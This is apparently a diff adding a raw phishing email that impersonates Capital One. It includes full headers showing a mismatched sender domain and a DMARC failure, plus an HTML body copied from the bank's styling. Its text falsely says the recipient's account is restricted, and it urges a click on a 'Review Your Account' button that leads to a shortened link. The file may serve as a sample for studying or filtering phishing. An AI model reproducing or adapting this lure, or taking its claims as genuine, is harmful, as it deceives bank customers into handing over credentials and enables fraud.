@@ -1,0 +1,335 @@
+Return-Path: <zingerpie@kfcreview.com>
+Received: from kfcreview.com (ip151.ip-135-148-159.us [135.148.159.151])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 5as9924m82915h91cl1kf54h5j6mtnojj0qah5g1
+ for zingerpie@kfcreview.com;
+ Tue, 07 Jul 2026 19:21:53 +0000 (UTC)
+Received-SPF: none (spfCheck: 135.148.159.151 is neither permitted nor denied by domain of kfcreview.com) client-ip=135.148.159.151; envelope-from=zingerpie@kfcreview.com; helo=kfcreview.com;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 135.148.159.151 is neither permitted nor denied by domain of kfcreview.com) client-ip=135.148.159.151; envelope-from=zingerpie@kfcreview.com; helo=kfcreview.com;
+ dmarc=fail header.from=kfcreview.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFGNnBxRXBaSGVOSUdzN3M0Y3R2aW5HaTd3a00zbmQ5cDlqT3MwaXFXTUpuRUppeUVYdnVTcS9hZERuVDY1RW1FWDR4OUQvdDZYZ0F1RFRKaGs1WmlTOG1IZy9Oa0RhbUdKeHlWS0FNbmt4Yzh4TExrM3hiN1lhQUlwSGNLdndHdFFHaStzWFgxZE5MMmtNV2s5V2hMWXA5VE9IdFRwSFVCRmJMVmVkM0pnaWhCTDNDM3lnc3N0bTgyTm0xRTl2TGNMREswcUJSMWNSL3VvUnlaS1NBRmpkYW5LVzV2NG5KU01wek1nRUFDOFd1a2xFcmRXYVFHaXRuRGNXZ1VFU2FNa25yNk1VVkh6WXZuN3pSV3AwbGpYMmNQYm1sQzQyQThGdVlFWVdJbldneWUveXV3Y0ZVOVZVNzhKNlRDbWVLUzg9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=pc+R3fXW031vNzo82swU1338TP9VHXui0rOw2KZONKjLdd1QESgf0YFAqX9372py0bzWNz0S5665pbL735X1KLdBPJQji5cvnip5wzVtIK0t0k8thPCYNbuehsHF51R/6ZlFyE24eVrB8hcSe7usOZTO6FQsiJyKIES4PUoj/Ac=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1783452114; v=1; bh=ICuo7Ib6n0ItvDFyh93Tl4RF7t90Ldj7mxPVUwoo/7I=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Capital One" <zingerpie@kfcreview.com>
+To: zingerpie@kfcreview.com
+Subject: New message for review.
+Date: 08 Jul 2026 02:21:42 +0700
+Message-ID: <20260708022142.C293B07EDF01C380@kfcreview.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px;=
+ FONT-FAMILY: Verdana; WIDTH: 632px; WHITE-SPACE: normal; WORD-SPACING: 0px=
+; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
+ rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2=
+; LETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps=
+: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initia=
+l; text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 25px; PADDING-RIGHT: 25px">
+<IMG class=3D"v1lightimg v1webfont" style=3D"BORDER-TOP-STYLE: none; BOX-SI=
+ZING: border-box; FONT-SIZE: 14px; BORDER-LEFT-STYLE: none; FONT-FAMILY: ar=
+ial, helvetica, sans-serif; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: no=
+ne; COLOR: rgb(20,20,20); BORDER-RIGHT-STYLE: none; DISPLAY: block; LINE-HE=
+IGHT: 20px; font-variant-numeric: normal; font-variant-east-asian: normal; =
+font-variant-alternates: normal; font-kerning: auto; font-optical-sizing: a=
+uto; font-feature-settings: normal;=20
+font-variation-settings: normal; font-variant-position: normal; font-stretc=
+h: normal" border=3D0 alt=3D"Visit Capital One" src=3D"https://ecm.capitalo=
+ne.com/Messaging/assets/images/global/logo_core_3x.png" width=3D98 align=3D=
+middle height=3D35></TD>
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 25px; PADDING-RIGHT: 25px" align=3Dright>
+<A class=3Dv1webfont style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT=
+-DECORATION: none; FONT-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(37=
+,95,130); LINE-HEIGHT: normal; BACKGROUND-COLOR: transparent; font-variant-=
+numeric: normal; font-variant-east-asian: normal; font-variant-alternates: =
+normal; font-kerning: auto; font-optical-sizing: auto; font-feature-setting=
+s: normal; font-variation-settings: normal; font-variant-position: normal; =
+font-stretch: normal"=20
+href=3D"http://a%20new%20capital%20one%20document%20is%20ready%20for%20you/=
+" rel=3Dnoreferrer target=3D_blank><SPAN class=3Dv1textLink style=3D"BOX-SI=
+ZING: border-box; BORDER-BOTTOM: rgb(37,95,130) 1px solid; PADDING-BOTTOM: =
+1px; text-wrap: nowrap">Sign&nbsp;In</SPAN></A></TD></TR></TBODY></TABLE>
+<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Verda=
+na; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT=
+-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: norma=
+l; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
+; text-decoration-color: initial" cellSpacing=3D0=20
+cellPadding=3D0 width=3D"100%" bgColor=3D#013d5b border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1webfont style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial, =
+helvetica, sans-serif; COLOR: rgb(255,255,255); PADDING-BOTTOM: 20px; PADDI=
+NG-TOP: 20px; PADDING-LEFT: 25px; PADDING-RIGHT: 25px">
+<H1 style=3D"BOX-SIZING: border-box; FONT-SIZE: 20px; FONT-WEIGHT: normal; =
+MARGIN: 0px; LINE-HEIGHT: 26px">Your Capital&nbsp;One<SUP style=3D"BOX-SIZI=
+NG: border-box; FONT-SIZE: 13px; VERTICAL-ALIGN: baseline; POSITION: relati=
+ve; LINE-HEIGHT: 0px; TOP: -0.5em">&reg;</SUP>&nbsp;Security Message.</H1><=
+/TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px;=
+ FONT-FAMILY: Verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLA=
+PSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58)=
+; FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACI=
+NG: normal; font-variant-ligatures: normal; font-variant-caps: normal; -web=
+kit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decora=
+tion-style: initial; text-decoration-color: initial"=20
+cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0=
+>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1webfont style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FON=
+T-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTO=
+M: 20px; PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 22px; PADDING-=
+RIGHT: 25px">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 20px">Dear zingerpie,</=
+P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">Your Capital&nbsp;One acco=
+unt restricted as one of numerous account that needs to be reviewed. We str=
+ongly suggest, that you try to do the following.</P></TD></TR></TBODY></TAB=
+LE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px;=
+ FONT-FAMILY: Verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLA=
+PSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58)=
+; FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACI=
+NG: normal; font-variant-ligatures: normal; font-variant-caps: normal; -web=
+kit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decora=
+tion-style: initial; text-decoration-color: initial"=20
+cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0=
+>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 10px; =
+TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 25px; PADDING-RIGHT: 25=
+px">
+<DIV class=3Dv1cssbutton style=3D"BOX-SIZING: border-box; MAX-WIDTH: 300px;=
+ WIDTH: 300px; VERTICAL-ALIGN: top; DISPLAY: inline-block">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; HEIGHT: 48px">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box" bgColor=3D#25810e height=3D48>
+<A class=3Dv1webfont style=3D"BOX-SIZING: border-box; FONT-SIZE: 20px; TEXT=
+-DECORATION: none; BORDER-TOP: medium none; FONT-FAMILY: arial, helvetica, =
+sans-serif; BORDER-RIGHT: medium none; WIDTH: 300px; MIN-WIDTH: 300px; BORD=
+ER-BOTTOM: medium none; COLOR: rgb(255,255,255); BORDER-LEFT: medium none; =
+DISPLAY: inline-block; LINE-HEIGHT: 48px; BACKGROUND-COLOR: transparent; fo=
+nt-variant-numeric: normal; font-variant-east-asian: normal; font-variant-a=
+lternates: normal; font-kerning: auto;=20
+font-optical-sizing: auto; font-feature-settings: normal; font-variation-se=
+ttings: normal; font-variant-position: normal; font-stretch: normal" href=
+=3D"https://t.co/dsdrfBrmPS" rel=3Dnoreferrer target=3D_blank>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px" align=3Dcenter>Review =
+Your Account</P></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></D=
+IV>
+<P>&nbsp;</P>
+<P>&nbsp;</P></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px;=
+ FONT-FAMILY: Verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLA=
+PSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58)=
+; FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACI=
+NG: normal; font-variant-ligatures: normal; font-variant-caps: normal; -web=
+kit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decora=
+tion-style: initial; text-decoration-color: initial"=20
+cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0=
+>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1webfont style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FON=
+T-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTO=
+M: 20px; PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 22px; PADDING-=
+RIGHT: 25px">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">Complete all verification =
+process<BR>Once you've done this your account will be removed from the&nbsp=
+;restricted accounts automatically</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">&nbsp;</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">Thanks for choosing Capita=
+l&nbsp;One.</P></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px;=
+ FONT-FAMILY: Verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLA=
+PSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58)=
+; FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACI=
+NG: normal; font-variant-ligatures: normal; font-variant-caps: normal; -web=
+kit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decora=
+tion-style: initial; text-decoration-color: initial"=20
+cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0=
+>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; HEIGHT: 1px; WIDTH: 58=
+2px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 25px; LINE-HEIGHT=
+: 1px; PADDING-RIGHT: 25px; MAX-HEIGHT: 1px" align=3Dcenter>
+<DIV style=3D"BOX-SIZING: border-box; HEIGHT: 1px; WIDTH: 582px; BORDER-BOT=
+TOM: rgb(212,212,212) 1px solid"></DIV></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1webfont style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FON=
+T-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTO=
+M: 20px; PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 22px; PADDING-=
+RIGHT: 25px">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><STRONG style=3D"BOX-SIZIN=
+G: border-box; FONT-WEIGHT: bolder">Was this alert helpful?</STRONG>&nbsp;T=
+ell us what you think in one click.</P></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1footer style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; F=
+ONT-FAMILY: Verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPS=
+E: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); =
+FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(244,244,244); font-variant-ligatures: norma=
+l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
+on-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(212,212,212) 1px so=
+lid; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 25px; PADDING-R=
+IGHT: 25px">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box" width=3D50>
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(0,172=
+,255); DISPLAY: block; BACKGROUND-COLOR: transparent"=20
+href=3D"https://deref-mail.com/mail/client/yFeUu-PFAHw/dereferrer/?redirect=
+Url=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FAwbYliMxS6d=
+oIWejRxpfmQ%7E%7E%2FAAAAAQA%7E%2FRgRoTurFP0R1aHR0cDovL21pLmNhcGl0YWxvbmUuY2=
+9tL3AvY3AvNjQ1MjE2MTYwNTNmMzk2OC9jP3VybD1odHRwJTNBJTJGJTJGbWkuY2FwaXRhbG9uZ=
+S5jb20lMkZwJTJGcnAlMkYzNWQ1ZmY2Y2EwNjRjM2E5JTJGdXJsVwZjYXBvbmVCCmZVxWVsZibh=
+YH1SJW1pa2VtaWtlYXNoY29udHJhY3RpbmdAY29udHJhY3Rvci5uZXRYBAAAAAA%7E&amp;lm" =
+rel=3Dnoreferrer target=3D_blank>
+<IMG class=3Dv1webfont style=3D"BORDER-TOP-STYLE: none; BOX-SIZING: border-=
+box; FONT-SIZE: 10px; BORDER-LEFT-STYLE: none; FONT-FAMILY: arial, helvetic=
+a, sans-serif; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; COLOR: rg=
+b(103,104,104); BORDER-RIGHT-STYLE: none; DISPLAY: block; LINE-HEIGHT: 12px=
+; font-variant-numeric: normal; font-variant-east-asian: normal; font-varia=
+nt-alternates: normal; font-kerning: auto; font-optical-sizing: auto; font-=
+feature-settings: normal; font-variation-settings:=20
+normal; font-variant-position: normal; font-stretch: normal" border=3D0 alt=
+=3D"Download the Capital One Mobile app" src=3D"https://ecm.capitalone.com/=
+Messaging/assets/images/global/iconsoc_mb_3x.png" width=3D27 height=3D27></=
+A></TD>
+<TD class=3Dv1webfont style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial, =
+helvetica, sans-serif; COLOR: rgb(103,104,104); LINE-HEIGHT: 16px">
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(103,1=
+04,104); BACKGROUND-COLOR: transparent"=20
+href=3D"https://deref-mail.com/mail/client/yFeUu-PFAHw/dereferrer/?redirect=
+Url=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FAwbYliMxS6d=
+oIWejRxpfmQ%7E%7E%2FAAAAAQA%7E%2FRgRoTurFP0R1aHR0cDovL21pLmNhcGl0YWxvbmUuY2=
+9tL3AvY3AvNjQ1MjE2MTYwNTNmMzk2OC9jP3VybD1odHRwJTNBJTJGJTJGbWkuY2FwaXRhbG9uZ=
+S5jb20lMkZwJTJGcnAlMkYzNWQ1ZmY2Y2EwNjRjM2E5JTJGdXJsVwZjYXBvbmVCCmZVxWVsZibh=
+YH1SJW1pa2VtaWtlYXNoY29udHJhY3RpbmdAY29udHJhY3Rvci5uZXRYBAAAAAA%7E&amp;lm" =
+rel=3Dnoreferrer target=3D_blank>
+<SPAN class=3Dv1textLink style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rg=
+b(103,104,104) 1px solid; PADDING-BOTTOM: 1px">Download the Capital&nbsp;On=
+e Mobile app.</SPAN></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE=
+>
+<TABLE class=3Dv1footer style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; F=
+ONT-FAMILY: Verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPS=
+E: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); =
+FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(244,244,244); font-variant-ligatures: norma=
+l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
+on-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1webfont style=3D'BOX-SIZING: border-box; FONT-SIZE: 10px; FON=
+T-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(105,10=
+5,105); PADDING-BOTTOM: 24px; PADDING-TOP: 24px; PADDING-LEFT: 24px; LINE-H=
+EIGHT: 16px; PADDING-RIGHT: 24px; font-variant-numeric: normal; font-varian=
+t-east-asian: normal; font-variant-alternates: normal; font-kerning: auto; =
+font-optical-sizing: auto; font-feature-settings: normal; font-variation-se=
+ttings: normal; font-variant-position: normal;=20
+font-stretch: normal'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 10px; FONT-WEIGHT: 700; MAR=
+GIN: 0px 0px 16px; LINE-HEIGHT: 16px">About this message</H2>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Web access is nee=
+ded to use mobile banking. Check with your service provider for det<SPAN st=
+yle=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING: border-box">Unlin=
+k</SPAN></SPAN>ails on specific fees and charges.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">The site may be u=
+navailable during normal maintenance or due to unforeseen circumstances.</P=
+>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><SPAN class=3Dv1textLink s=
+tyle=3D"BOX-SIZING: border-box; BORDER-BOTTOM: 1px solid; PADDING-BOTTOM: 1=
+px">Please visit our Set Alerts page</SPAN>&nbsp;to modify your alerts subs=
+cription preferences.</P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; HEIGHT: 1px; PADDING-B=
+OTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 24px; LINE-HEIGHT: 0; PADDING-R=
+IGHT: 24px">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(125,125,125) 1px s=
+olid">&nbsp;</DIV></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1footer style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; F=
+ONT-FAMILY: Verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPS=
+E: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); =
+FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(244,244,244); font-variant-ligatures: norma=
+l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
+on-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1webfont style=3D'BOX-SIZING: border-box; FONT-SIZE: 10px; FON=
+T-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(105,10=
+5,105); PADDING-BOTTOM: 24px; PADDING-TOP: 24px; PADDING-LEFT: 24px; LINE-H=
+EIGHT: 16px; PADDING-RIGHT: 24px; font-variant-numeric: normal; font-varian=
+t-east-asian: normal; font-variant-alternates: normal; font-kerning: auto; =
+font-optical-sizing: auto; font-feature-settings: normal; font-variation-se=
+ttings: normal; font-variant-position: normal;=20
+font-stretch: normal'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 10px; FONT-WEIGHT: 700; MAR=
+GIN: 0px 0px 16px; LINE-HEIGHT: 16px">Important information from Capital&nb=
+sp;One</H2>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px"><SPAN class=3Dv1c=
+om-tran style=3D"BOX-SIZING: border-box"><SPAN class=3Dv1textLink style=3D"=
+BOX-SIZING: border-box; BORDER-BOTTOM: 1px solid; PADDING-BOTTOM: 1px">Cont=
+act us</SPAN>&nbsp;&nbsp;|&nbsp;&nbsp;<SPAN class=3Dv1textLink style=3D"BOX=
+-SIZING: border-box; BORDER-BOTTOM: 1px solid; PADDING-BOTTOM: 1px">Privacy=
+</SPAN>&nbsp;&nbsp;|&nbsp;&nbsp;<SPAN class=3Dv1textLink style=3D"BOX-SIZIN=
+G: border-box; BORDER-BOTTOM: 1px solid; PADDING-BOTTOM: 1px">
+ Help prevent fraud</SPAN></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">To ensure deliver=
+y, add&nbsp;<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLO=
+R: rgb(105,105,105); BACKGROUND-COLOR: transparent" rel=3Dnoreferrer>capita=
+lone@notification.capitalone.com</A>&nbsp;to your address book.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px"><SPAN class=3Dv1c=
+om-tran style=3D"BOX-SIZING: border-box">This email was sent to zingerpie@k=
+fcreview.com&nbsp;and contains information directly related to your account=
+ with us, other services to which you have subscribed, and/or any applicati=
+on you may have submitted.</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Capital One does =
+not provide, endorse or guarantee any third-party product, service, informa=
+tion or recommendation listed above. The third parties listed are not affil=
+iated with Capital&nbsp;One and are solely responsible for their products a=
+nd services. All trademarks are the property of their respective owners.</P=
+>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Please do not rep=
+ly to this message, as this email inbox is not monitored.&nbsp;<SPAN class=
+=3Dv1textLink style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: 1px solid; PA=
+DDING-BOTTOM: 1px">To contact us, visit www.capitalone.com/help-center/cont=
+act-us.</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Products and serv=
+ices are offered by Capital&nbsp;One, N.A.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">&copy; 2026 Capit=
+al&nbsp;One. Capital&nbsp;One is a federally registered service mark.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><SPAN class=3Dv1info style=
+=3D"BOX-SIZING: border-box">DOCAVL 44079 11343</SPAN></P></TD></TR></TBODY>=
+</TABLE></BODY></HTML>
